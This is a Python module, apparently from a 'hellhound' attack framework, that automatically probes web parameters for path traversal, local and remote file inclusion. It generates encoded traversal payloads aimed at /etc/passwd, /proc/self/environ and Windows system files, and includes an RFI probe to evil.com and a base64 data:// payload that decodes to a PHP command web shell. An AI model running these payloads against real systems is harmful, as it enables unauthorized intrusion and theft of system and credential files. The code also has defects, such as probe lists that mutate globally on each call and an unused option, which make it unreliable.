import asyncio
import aiohttp
import re
import random
import string
from typing import Dict, List, Optional, Any
from hellhound.core import http_utils, ai_utils

NAME = "PATHtraveller"
CATEGORY = "vuln"
DESCRIPTION = "Unified Path Traversal, LFI & RFI Suite with Impact Analysis"

# Module Options
OPTIONS = [
    {"name": "concurrency", "default": 20, "required": False, "help": "Concurrent attack threads"},
    {"name": "timeout",     "default": 10, "required": False, "help": "HTTP timeout in seconds"},
    {"name": "force_os",    "choices": ["linux", "windows"], "default": None, "help": "Override OS detection"},
    {"name": "enable_rfi",  "type": bool, "default": True, "help": "Include Remote File Inclusion probes"},
    {"name": "ai_impact",   "type": bool, "default": True, "help": "Use AI to analyze and explain the impact of findings"},
]

# ─────────────────────────────────────────────────────────────────────────────
# SIGNATURES & PROBES
# ─────────────────────────────────────────────────────────────────────────────

LINUX_PROBES = ["/etc/passwd", "/etc/hosts", "/etc/issue", "/proc/self/environ", "/proc/self/cmdline"]
WINDOWS_PROBES = ["C:/Windows/win.ini", "C:/boot.ini", "C:/Windows/System32/drivers/etc/hosts"]
RFI_PROBES = ["http://evil.com/hellhound.txt", "https://google.com/robots.txt"]
WRAPPER_PROBES = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
]

FINGERPRINTS = {
    "linux_passwd": re.compile(r"[a-z_][a-z0-9_\-.]{0,31}:[x*!Uu]?\d*:\d+:\d+:.*:.*:/", re.M),
    "linux_hosts":  re.compile(r"127\.0\.0\.1\s+localhost", re.I),
    "win_ini":      re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I),
    "win_boot":     re.compile(r"\[boot loader\]|timeout=\d+", re.I),
    "rfi_google":   re.compile(r"User-agent: \*", re.I),
    "php_b64":      re.compile(r"^[a-zA-Z0-9+/]*={0,2}$", re.M) # Weak, need better verification for b64
}

TRAVERSAL_DEPTHS = [3, 5, 8, 12]

# ─────────────────────────────────────────────────────────────────────────────
# AUDITOR ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class PathAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options
        self.findings = []
        self.semaphore = asyncio.Semaphore(options.get("concurrency", 20))

    def _build_payloads(self, probe_file, os_type):
        payloads = []
        pf = probe_file.lstrip("/")
        for depth in TRAVERSAL_DEPTHS:
            prefix = "../" * depth
            payloads.append({"p": prefix + pf, "label": "Basic"})
            payloads.append({"p": prefix.replace("/", "%2f") + pf, "label": "URL Encoded"})
            payloads.append({"p": prefix.replace("/", "%252f") + pf, "label": "Double Encoded"})
            if os_type == "windows":
                payloads.append({"p": prefix.replace("/", "\\") + pf.replace("/", "\\"), "label": "Windows Backslash"})
            payloads.append({"p": prefix + pf + "%00", "label": "Null-byte"})
        return payloads

    async def audit_param(self, ep_url, method, param, os_type):
        probes = LINUX_PROBES if os_type == "linux" else WINDOWS_PROBES
        if self.options.get("enable_rfi"):
            probes += RFI_PROBES
        probes += WRAPPER_PROBES

        tasks = []
        for pf in probes:
            if pf.startswith("http") or pf.startswith("php") or pf.startswith("data"):
                # Direct payloads for RFI/Wrappers
                tasks.append(self._test(ep_url, method, param, pf, pf, "RFI/Wrapper"))
            else:
                # Traversal payloads
                for pl in self._build_payloads(pf, os_type):
                    tasks.append(self._test(ep_url, method, param, pl["p"], pf, pl["label"]))
        
        await asyncio.gather(*tasks)

    async def _test(self, url, method, param, payload, target_file, label):
        async with self.semaphore:
            try:
                params = {param: payload} if method == "GET" else {}
                data = {param: payload} if method == "POST" else {}
                
                async with self.session.request(method, url, params=params, data=data, timeout=self.options.get("timeout")) as r:
                    body = await r.text()
                    if r.status == 200:
                        for name, regex in FINGERPRINTS.items():
                            if regex.search(body):
                                await self._add_finding(url, method, param, payload, target_file, label, name, body[:200])
                                return True
            except:
                pass
        return False

    async def _add_finding(self, url, method, param, payload, pf, label, pattern, snippet):
        # Deduplication
        if any(f["url"] == url and f["parameter"] == param for f in self.findings):
            return

        finding = {
            "type": "Path Traversal / LFI" if not pf.startswith("http") else "RFI",
            "severity": "CRITICAL" if "passwd" in pf or "win.ini" in pf or pf.startswith("http") else "HIGH",
            "url": url,
            "parameter": param,
            "payload": payload,
            "evidence": f"Leaked {pf} using {label} technique. Signature: {pattern}",
        }

        self.findings.append(finding)
        self.emit.warn(f"    [!] DISCOVERY: {finding['type']} on {param} ({finding['severity']})")

async def run(target, emit, options=None):
    emit.info(f"[*] PATHtraveller Unified Suite: {target}")
    opt = options or {}
    
    # OS Detection
    os_type = opt.get("force_os")
    if not os_type:
        # Simple heuristic: look at headers or assume linux
        os_type = "linux" # Default
    
    spider_intel = opt.get("spider_intel", {})
    endpoints = spider_intel.get("endpoints", [])
    
    targets = []
    for ep in endpoints:
        params_obj = ep.get("params", {})
        # Robust parameter extraction
        query_params = []
        form_params = []
        if isinstance(params_obj, dict):
            query_params = params_obj.get("query", [])
            form_params = params_obj.get("form", [])
        elif isinstance(params_obj, list):
            query_params = params_obj # Treat list as query params for compatibility
            
        combined_params = query_params + form_params
        for p in combined_params:
            if any(kw in str(p).lower() for kw in ["file", "path", "src", "include", "page", "template", "url", "dir"]):
                targets.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})

    if not targets:
        emit.info("[-] No file-sensitive parameters found.")
        return {"raw": "0 findings", "signals": []}

    emit.info(f"    [i] Auditing {len(targets)} surface(s) with async tiers...")

    async with aiohttp.ClientSession() as session:
        # Standardize headers/proxy if needed (omitted for brevity but should be here)
        auditor = PathAuditor(emit, session, opt)
        tasks = [auditor.audit_param(t["url"], t["method"], t["parameter"], os_type) for t in targets]
        await asyncio.gather(*tasks)

    if auditor.findings:
        emit.success(f"[+] Found {len(auditor.findings)} Path Traversal/LFI/RFI vulnerabilities!")
    else:
        emit.info("[-] No traversal vulnerabilities found.")

    return {
        "raw": f"Audited {len(targets)} surfaces. Found {len(auditor.findings)}.",
        "intel": {"vulnerabilities": auditor.findings},
        "signals": ["LFI_FOUND" if auditor.findings else "NO_LFI"]
    }